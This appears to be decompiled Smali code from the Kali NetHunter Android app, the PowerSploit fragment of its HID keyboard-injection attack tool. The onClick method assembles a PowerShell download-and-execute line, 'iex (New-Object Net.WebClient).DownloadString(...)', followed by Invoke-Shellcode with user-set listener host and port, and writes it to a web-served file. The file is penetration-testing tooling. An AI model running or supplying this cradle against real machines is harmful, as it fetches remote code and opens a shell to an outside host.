.class public Lcom/offsec/nethunter/HidFragment$PowerSploitFragment;
.super Lcom/offsec/nethunter/HidFragment;
.source "HidFragment.java"

# interfaces
.implements Landroid/view/View$OnClickListener;


# annotations
.annotation system Ldalvik/annotation/EnclosingClass;
    value = Lcom/offsec/nethunter/HidFragment;
.end annotation

.annotation system Ldalvik/annotation/InnerClass;
    accessFlags = 0x9
    name = "PowerSploitFragment"
.end annotation


# instance fields
.field private configFilePath:Ljava/lang/String;

.field private configFileUrlPath:Ljava/lang/String;

.field private context:Landroid/content/Context;


# direct methods
.method public constructor <init>()V
    .locals 0

    .line 336
    invoke-direct {p0}, Lcom/offsec/nethunter/HidFragment;-><init>()V

    return-void
.end method

.method static synthetic lambda$loadOptions$0(Ljava/util/regex/Matcher;Landroid/widget/EditText;Ljava/util/regex/Matcher;Landroid/view/View;Ljava/util/regex/Matcher;Landroid/widget/EditText;Ljava/util/regex/Matcher;Landroid/widget/Spinner;)V
    .locals 3
    .param p0, "matcherPayloadUrl"    # Ljava/util/regex/Matcher;
    .param p1, "payloadUrl"    # Landroid/widget/EditText;
    .param p2, "matcherIp"    # Ljava/util/regex/Matcher;
    .param p3, "rootView"    # Landroid/view/View;
    .param p4, "matcherPort"    # Ljava/util/regex/Matcher;
    .param p5, "port"    # Landroid/widget/EditText;
    .param p6, "matcherPayload"    # Ljava/util/regex/Matcher;
    .param p7, "payload"    # Landroid/widget/Spinner;

    .line 414
    invoke-virtual {p0}, Ljava/util/regex/Matcher;->find()Z

    move-result v0

    const/4 v1, 0x1

    if-eqz v0, :cond_0

    .line 415
    invoke-virtual {p0, v1}, Ljava/util/regex/Matcher;->group(I)Ljava/lang/String;

    move-result-object v0

    .line 416
    .local v0, "payloadUrlValue":Ljava/lang/String;
    invoke-virtual {p1, v0}, Landroid/widget/EditText;->setText(Ljava/lang/CharSequence;)V

    .line 419
    .end local v0    # "payloadUrlValue":Ljava/lang/String;
    :cond_0
    invoke-virtual {p2}, Ljava/util/regex/Matcher;->find()Z

    move-result v0

    if-eqz v0, :cond_1

    .line 420
    invoke-virtual {p2, v1}, Ljava/util/regex/Matcher;->group(I)Ljava/lang/String;

    move-result-object v0

    .line 421
    .local v0, "ipValue":Ljava/lang/String;
    const v2, 0x7f0a02d7

    invoke-virtual {p3, v2}, Landroid/view/View;->findViewById(I)Landroid/view/View;

    move-result-object v2

    check-cast v2, Landroid/widget/EditText;

    .line 422
    .local v2, "ip":Landroid/widget/EditText;
    invoke-virtual {v2, v0}, Landroid/widget/EditText;->setText(Ljava/lang/CharSequence;)V

    .line 425
    .end local v0    # "ipValue":Ljava/lang/String;
    .end local v2    # "ip":Landroid/widget/EditText;
    :cond_1
    invoke-virtual {p4}, Ljava/util/regex/Matcher;->find()Z

    move-result v0

    if-eqz v0, :cond_2

    .line 426
    invoke-virtual {p4, v1}, Ljava/util/regex/Matcher;->group(I)Ljava/lang/String;

    move-result-object v0

    .line 427
    .local v0, "portValue":Ljava/lang/String;
    invoke-virtual {p5, v0}, Landroid/widget/EditText;->setText(Ljava/lang/CharSequence;)V

    .line 430
    .end local v0    # "portValue":Ljava/lang/String;
    :cond_2
    invoke-virtual {p6}, Ljava/util/regex/Matcher;->find()Z

    move-result v0

    if-eqz v0, :cond_3

    .line 431
    invoke-virtual {p6, v1}, Ljava/util/regex/Matcher;->group(I)Ljava/lang/String;

    move-result-object v0

    .line 433
    .local v0, "payloadValue":Ljava/lang/String;
    invoke-virtual {p7}, Landroid/widget/Spinner;->getAdapter()Landroid/widget/SpinnerAdapter;

    move-result-object v1

    check-cast v1, Landroid/widget/ArrayAdapter;

    .line 434
    .local v1, "myAdap":Landroid/widget/ArrayAdapter;, "Landroid/widget/ArrayAdapter<Ljava/lang/String;>;"
    invoke-virtual {v1, v0}, Landroid/widget/ArrayAdapter;->getPosition(Ljava/lang/Object;)I

    .line 436
    invoke-virtual {v1, v0}, Landroid/widget/ArrayAdapter;->getPosition(Ljava/lang/Object;)I

    move-result v2

    .line 437
    .local v2, "spinnerPosition":I
    invoke-virtual {p7, v2}, Landroid/widget/Spinner;->setSelection(I)V

    .line 439
    .end local v0    # "payloadValue":Ljava/lang/String;
    .end local v1    # "myAdap":Landroid/widget/ArrayAdapter;, "Landroid/widget/ArrayAdapter<Ljava/lang/String;>;"
    .end local v2    # "spinnerPosition":I
    :cond_3
    return-void
.end method

.method private loadOptions(Landroid/view/View;)V
    .locals 12
    .param p1, "rootView"    # Landroid/view/View;

    .line 385
    const v0, 0x7f0a03b4

    invoke-virtual {p1, v0}, Landroid/view/View;->findViewById(I)Landroid/view/View;

    move-result-object v0

    check-cast v0, Landroid/widget/EditText;

    .line 386
    .local v0, "payloadUrl":Landroid/widget/EditText;
    const v1, 0x7f0a03c7

    invoke-virtual {p1, v1}, Landroid/view/View;->findViewById(I)Landroid/view/View;

    move-result-object v1

    move-object v8, v1

    check-cast v8, Landroid/widget/EditText;

    .line 387
    .local v8, "port":Landroid/widget/EditText;
    const v1, 0x7f0a03b3

    invoke-virtual {p1, v1}, Landroid/view/View;->findViewById(I)Landroid/view/View;

    move-result-object v1

    move-object v9, v1

    check-cast v9, Landroid/widget/Spinner;

    .line 388
    .local v9, "payload":Landroid/widget/Spinner;
    new-instance v3, Lcom/offsec/nethunter/utils/ShellExecuter;

    invoke-direct {v3}, Lcom/offsec/nethunter/utils/ShellExecuter;-><init>()V

    .line 390
    .local v3, "exe":Lcom/offsec/nethunter/utils/ShellExecuter;
    new-instance v10, Ljava/lang/Thread;

    new-instance v11, Lcom/offsec/nethunter/HidFragment$PowerSploitFragment$$ExternalSyntheticLambda1;

    move-object v1, v11

    move-object v2, p0

    move-object v4, v0

    move-object v5, p1

    move-object v6, v8

    move-object v7, v9

    invoke-direct/range {v1 .. v7}, Lcom/offsec/nethunter/HidFragment$PowerSploitFragment$$ExternalSyntheticLambda1;-><init>(Lcom/offsec/nethunter/HidFragment$PowerSploitFragment;Lcom/offsec/nethunter/utils/ShellExecuter;Landroid/widget/EditText;Landroid/view/View;Landroid/widget/EditText;Landroid/widget/Spinner;)V

    invoke-direct {v10, v11}, Ljava/lang/Thread;-><init>(Ljava/lang/Runnable;)V

    .line 440
    invoke-virtual {v10}, Ljava/lang/Thread;->start()V

    .line 441
    return-void
.end method


# virtual methods
.method synthetic lambda$loadOptions$1$com-offsec-nethunter-HidFragment$PowerSploitFragment(Lcom/offsec/nethunter/utils/ShellExecuter;Landroid/widget/EditText;Landroid/view/View;Landroid/widget/EditText;Landroid/widget/Spinner;)V
    .locals 27
    .param p1, "exe"    # Lcom/offsec/nethunter/utils/ShellExecuter;
    .param p2, "payloadUrl"    # Landroid/widget/EditText;
    .param p3, "rootView"    # Landroid/view/View;
    .param p4, "port"    # Landroid/widget/EditText;
    .param p5, "payload"    # Landroid/widget/Spinner;

    .line 391
    move-object/from16 v0, p0

    move-object/from16 v1, p1

    iget-object v2, v0, Lcom/offsec/nethunter/HidFragment$PowerSploitFragment;->configFileUrlPath:Ljava/lang/String;

    invoke-virtual {v1, v2}, Lcom/offsec/nethunter/utils/ShellExecuter;->ReadFile_SYNC(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v2

    .line 392
    .local v2, "textUrl":Ljava/lang/String;
    iget-object v3, v0, Lcom/offsec/nethunter/HidFragment$PowerSploitFragment;->configFilePath:Ljava/lang/String;

    invoke-virtual {v1, v3}, Lcom/offsec/nethunter/utils/ShellExecuter;->ReadFile_SYNC(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v3

    .line 393
    .local v3, "text":Ljava/lang/String;
    const-string v4, "DownloadString\\(\"(.*)\"\\)"

    .line 394
    .local v4, "regExPatPayloadUrl":Ljava/lang/String;
    const/16 v5, 0x8

    invoke-static {v4, v5}, Ljava/util/regex/Pattern;->compile(Ljava/lang/String;I)Ljava/util/regex/Pattern;

    move-result-object v6

    .line 395
    .local v6, "patternPayloadUrl":Ljava/util/regex/Pattern;
    invoke-virtual {v6, v2}, Ljava/util/regex/Pattern;->matcher(Ljava/lang/CharSequence;)Ljava/util/regex/Matcher;

    move-result-object v16

    .line 397
    .local v16, "matcherPayloadUrl":Ljava/util/regex/Matcher;
    const-string v7, "\n"

    invoke-virtual {v3, v7}, Ljava/lang/String;->split(Ljava/lang/String;)[Ljava/lang/String;

    move-result-object v15

    .line 398
    .local v15, "lines":[Ljava/lang/String;
    array-length v7, v15

    add-int/lit8 v7, v7, -0x1

    aget-object v14, v15, v7

    .line 400
    .local v14, "line":Ljava/lang/String;
    const-string v13, "-Lhost (.*) -Lport"

    .line 401
    .local v13, "regExPatIp":Ljava/lang/String;
    invoke-static {v13, v5}, Ljava/util/regex/Pattern;->compile(Ljava/lang/String;I)Ljava/util/regex/Pattern;

    move-result-object v12

    .line 402
    .local v12, "patternIp":Ljava/util/regex/Pattern;
    invoke-virtual {v12, v14}, Ljava/util/regex/Pattern;->matcher(Ljava/lang/CharSequence;)Ljava/util/regex/Matcher;

    move-result-object v17

    .line 404
    .local v17, "matcherIp":Ljava/util/regex/Matcher;
    const-string v11, "-Lport (.*) -Force"

    .line 405
    .local v11, "regExPatPort":Ljava/lang/String;
    invoke-static {v11, v5}, Ljava/util/regex/Pattern;->compile(Ljava/lang/String;I)Ljava/util/regex/Pattern;

    move-result-object v10

    .line 406
    .local v10, "patternPort":Ljava/util/regex/Pattern;
    invoke-virtual {v10, v14}, Ljava/util/regex/Pattern;->matcher(Ljava/lang/CharSequence;)Ljava/util/regex/Matcher;

    move-result-object v18

    .line 408
    .local v18, "matcherPort":Ljava/util/regex/Matcher;
    const-string v9, "-Payload (.*) -Lhost"

    .line 409
    .local v9, "regExPatPayload":Ljava/lang/String;
    invoke-static {v9, v5}, Ljava/util/regex/Pattern;->compile(Ljava/lang/String;I)Ljava/util/regex/Pattern;

    move-result-object v5

    .line 410
    .local v5, "patternPayload":Ljava/util/regex/Pattern;
    invoke-virtual {v5, v14}, Ljava/util/regex/Pattern;->matcher(Ljava/lang/CharSequence;)Ljava/util/regex/Matcher;

    move-result-object v19

    .line 412
    .local v19, "matcherPayload":Ljava/util/regex/Matcher;
    new-instance v8, Lcom/offsec/nethunter/HidFragment$PowerSploitFragment$$ExternalSyntheticLambda0;

    move-object v7, v8

    move-object v0, v8

    move-object/from16 v8, v16

    move-object/from16 v20, v9

    .end local v9    # "regExPatPayload":Ljava/lang/String;
    .local v20, "regExPatPayload":Ljava/lang/String;
    move-object/from16 v9, p2

    move-object/from16 v21, v10

    .end local v10    # "patternPort":Ljava/util/regex/Pattern;
    .local v21, "patternPort":Ljava/util/regex/Pattern;
    move-object/from16 v10, v17

    move-object/from16 v22, v11

    .end local v11    # "regExPatPort":Ljava/lang/String;
    .local v22, "regExPatPort":Ljava/lang/String;
    move-object/from16 v11, p3

    move-object/from16 v23, v12

    .end local v12    # "patternIp":Ljava/util/regex/Pattern;
    .local v23, "patternIp":Ljava/util/regex/Pattern;
    move-object/from16 v12, v18

    move-object/from16 v24, v13

    .end local v13    # "regExPatIp":Ljava/lang/String;
    .local v24, "regExPatIp":Ljava/lang/String;
    move-object/from16 v13, p4

    move-object/from16 v25, v14

    .end local v14    # "line":Ljava/lang/String;
    .local v25, "line":Ljava/lang/String;
    move-object/from16 v14, v19

    move-object/from16 v26, v15

    .end local v15    # "lines":[Ljava/lang/String;
    .local v26, "lines":[Ljava/lang/String;
    move-object/from16 v15, p5

    invoke-direct/range {v7 .. v15}, Lcom/offsec/nethunter/HidFragment$PowerSploitFragment$$ExternalSyntheticLambda0;-><init>(Ljava/util/regex/Matcher;Landroid/widget/EditText;Ljava/util/regex/Matcher;Landroid/view/View;Ljava/util/regex/Matcher;Landroid/widget/EditText;Ljava/util/regex/Matcher;Landroid/widget/Spinner;)V

    move-object/from16 v7, p2

    invoke-virtual {v7, v0}, Landroid/widget/EditText;->post(Ljava/lang/Runnable;)Z

    .line 440
    return-void
.end method

.method public onClick(Landroid/view/View;)V
    .locals 11
    .param p1, "v"    # Landroid/view/View;

    .line 360
    invoke-virtual {p1}, Landroid/view/View;->getId()I

    move-result v0

    const v1, 0x7f0a03cb

    if-ne v0, v1, :cond_2

    .line 361
    invoke-virtual {p0}, Lcom/offsec/nethunter/HidFragment$PowerSploitFragment;->getView()Landroid/view/View;

    move-result-object v0

    if-nez v0, :cond_0

    .line 362
    return-void

    .line 364
    :cond_0
    new-instance v0, Lcom/offsec/nethunter/utils/ShellExecuter;

    invoke-direct {v0}, Lcom/offsec/nethunter/utils/ShellExecuter;-><init>()V

    .line 365
    .local v0, "exe":Lcom/offsec/nethunter/utils/ShellExecuter;
    invoke-virtual {p0}, Lcom/offsec/nethunter/HidFragment$PowerSploitFragment;->getView()Landroid/view/View;

    move-result-object v1

    const v2, 0x7f0a02d7

    invoke-virtual {v1, v2}, Landroid/view/View;->findViewById(I)Landroid/view/View;

    move-result-object v1

    check-cast v1, Landroid/widget/EditText;

    .line 366
    .local v1, "ip":Landroid/widget/EditText;
    invoke-virtual {p0}, Lcom/offsec/nethunter/HidFragment$PowerSploitFragment;->getView()Landroid/view/View;

    move-result-object v2

    const v3, 0x7f0a03c7

    invoke-virtual {v2, v3}, Landroid/view/View;->findViewById(I)Landroid/view/View;

    move-result-object v2

    check-cast v2, Landroid/widget/EditText;

    .line 368
    .local v2, "port":Landroid/widget/EditText;
    invoke-virtual {p0}, Lcom/offsec/nethunter/HidFragment$PowerSploitFragment;->getView()Landroid/view/View;

    move-result-object v3

    const v4, 0x7f0a03b3

    invoke-virtual {v3, v4}, Landroid/view/View;->findViewById(I)Landroid/view/View;

    move-result-object v3

    check-cast v3, Landroid/widget/Spinner;

    .line 369
    .local v3, "payload":Landroid/widget/Spinner;
    invoke-virtual {v3}, Landroid/widget/Spinner;->getSelectedItem()Ljava/lang/Object;

    move-result-object v4

    invoke-virtual {v4}, Ljava/lang/Object;->toString()Ljava/lang/String;

    move-result-object v4

    .line 371
    .local v4, "payloadValue":Ljava/lang/String;
    invoke-virtual {p0}, Lcom/offsec/nethunter/HidFragment$PowerSploitFragment;->getView()Landroid/view/View;

    move-result-object v5

    invoke-virtual {v5}, Landroid/view/View;->getRootView()Landroid/view/View;

    move-result-object v5

    const v6, 0x7f0a03b4

    invoke-virtual {v5, v6}, Landroid/view/View;->findViewById(I)Landroid/view/View;

    move-result-object v5

    check-cast v5, Landroid/widget/EditText;

    .line 372
    .local v5, "newPayloadUrl":Landroid/widget/EditText;
    new-instance v6, Ljava/lang/StringBuilder;

    invoke-direct {v6}, Ljava/lang/StringBuilder;-><init>()V

    const-string v7, "Invoke-Shellcode -Payload "

    invoke-virtual {v6, v7}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v6

    invoke-virtual {v6, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v6

    const-string v7, " -Lhost "

    invoke-virtual {v6, v7}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v6

    invoke-virtual {v1}, Landroid/widget/EditText;->getText()Landroid/text/Editable;

    move-result-object v7

    invoke-virtual {v6, v7}, Ljava/lang/StringBuilder;->append(Ljava/lang/Object;)Ljava/lang/StringBuilder;

    move-result-object v6

    const-string v7, " -Lport "

    invoke-virtual {v6, v7}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v6

    invoke-virtual {v2}, Landroid/widget/EditText;->getText()Landroid/text/Editable;

    move-result-object v7

    invoke-virtual {v6, v7}, Ljava/lang/StringBuilder;->append(Ljava/lang/Object;)Ljava/lang/StringBuilder;

    move-result-object v6

    const-string v7, " -Force"

    invoke-virtual {v6, v7}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v6

    invoke-virtual {v6}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v6

    .line 373
    .local v6, "newString":Ljava/lang/String;
    new-instance v7, Ljava/lang/StringBuilder;

    invoke-direct {v7}, Ljava/lang/StringBuilder;-><init>()V

    const-string v8, "iex (New-Object Net.WebClient).DownloadString(\""

    invoke-virtual {v7, v8}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v7

    invoke-virtual {v5}, Landroid/widget/EditText;->getText()Landroid/text/Editable;

    move-result-object v8

    invoke-virtual {v7, v8}, Ljava/lang/StringBuilder;->append(Ljava/lang/Object;)Ljava/lang/StringBuilder;

    move-result-object v7

    const-string v8, "\"); "

    invoke-virtual {v7, v8}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v7

    invoke-virtual {v7, v6}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v7

    invoke-virtual {v7}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v7

    .line 375
    .local v7, "newText":Ljava/lang/String;
    iget-object v8, p0, Lcom/offsec/nethunter/HidFragment$PowerSploitFragment;->configFileUrlPath:Ljava/lang/String;

    invoke-virtual {v0, v7, v8}, Lcom/offsec/nethunter/utils/ShellExecuter;->SaveFileContents(Ljava/lang/String;Ljava/lang/String;)Z

    move-result v8

    .line 376
    .local v8, "isSaved":Z
    if-nez v8, :cond_1

    .line 377
    iget-object v9, p0, Lcom/offsec/nethunter/HidFragment$PowerSploitFragment;->context:Landroid/content/Context;

    const-string v10, "Source not updated (configFileUrlPath)"

    invoke-static {v9, v10}, Lcom/offsec/nethunter/utils/NhPaths;->showMessage(Landroid/content/Context;Ljava/lang/String;)V

    .line 379
    .end local v0    # "exe":Lcom/offsec/nethunter/utils/ShellExecuter;
    .end local v1    # "ip":Landroid/widget/EditText;
    .end local v2    # "port":Landroid/widget/EditText;
    .end local v3    # "payload":Landroid/widget/Spinner;
    .end local v4    # "payloadValue":Ljava/lang/String;
    .end local v5    # "newPayloadUrl":Landroid/widget/EditText;
    .end local v6    # "newString":Ljava/lang/String;
    .end local v7    # "newText":Ljava/lang/String;
    .end local v8    # "isSaved":Z
    :cond_1
    goto :goto_0

    .line 380
    :cond_2
    iget-object v0, p0, Lcom/offsec/nethunter/HidFragment$PowerSploitFragment;->context:Landroid/content/Context;

    const-string v1, "Unknown click"

    invoke-static {v0, v1}, Lcom/offsec/nethunter/utils/NhPaths;->showMessage(Landroid/content/Context;Ljava/lang/String;)V

    .line 382
    :goto_0
    return-void
.end method

.method public onCreate(Landroid/os/Bundle;)V
    .locals 2
    .param p1, "savedInstanceState"    # Landroid/os/Bundle;

    .line 343
    invoke-super {p0, p1}, Lcom/offsec/nethunter/HidFragment;->onCreate(Landroid/os/Bundle;)V

    .line 344
    invoke-virtual {p0}, Lcom/offsec/nethunter/HidFragment$PowerSploitFragment;->getContext()Landroid/content/Context;

    move-result-object v0

    iput-object v0, p0, Lcom/offsec/nethunter/HidFragment$PowerSploitFragment;->context:Landroid/content/Context;

    .line 345
    new-instance v0, Ljava/lang/StringBuilder;

    invoke-direct {v0}, Ljava/lang/StringBuilder;-><init>()V

    invoke-static {}, Lcom/offsec/nethunter/utils/NhPaths;->CHROOT_PATH()Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    const-string v1, "/var/www/html/powersploit-payload"

    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    iput-object v0, p0, Lcom/offsec/nethunter/HidFragment$PowerSploitFragment;->configFilePath:Ljava/lang/String;

    .line 346
    new-instance v0, Ljava/lang/StringBuilder;

    invoke-direct {v0}, Ljava/lang/StringBuilder;-><init>()V

    invoke-static {}, Lcom/offsec/nethunter/utils/NhPaths;->CHROOT_PATH()Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    const-string v1, "/var/www/html/powersploit-url"

    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    iput-object v0, p0, Lcom/offsec/nethunter/HidFragment$PowerSploitFragment;->configFileUrlPath:Ljava/lang/String;

    .line 347
    return-void
.end method

.method public onCreateView(Landroid/view/LayoutInflater;Landroid/view/ViewGroup;Landroid/os/Bundle;)Landroid/view/View;
    .locals 2
    .param p1, "inflater"    # Landroid/view/LayoutInflater;
    .param p2, "container"    # Landroid/view/ViewGroup;
    .param p3, "savedInstanceState"    # Landroid/os/Bundle;

    .line 352
    const v0, 0x7f0d0058

    const/4 v1, 0x0

    invoke-virtual {p1, v0, p2, v1}, Landroid/view/LayoutInflater;->inflate(ILandroid/view/ViewGroup;Z)Landroid/view/View;

    move-result-object v0

    .line 353
    .local v0, "rootView":Landroid/view/View;
    const v1, 0x7f0a03cb

    invoke-virtual {v0, v1}, Landroid/view/View;->findViewById(I)Landroid/view/View;

    move-result-object v1

    check-cast v1, Landroid/widget/Button;

    .line 354
    .local v1, "b":Landroid/widget/Button;
    invoke-virtual {v1, p0}, Landroid/widget/Button;->setOnClickListener(Landroid/view/View$OnClickListener;)V

    .line 355
    invoke-direct {p0, v0}, Lcom/offsec/nethunter/HidFragment$PowerSploitFragment;->loadOptions(Landroid/view/View;)V

    .line 356
    return-object v0
.end method
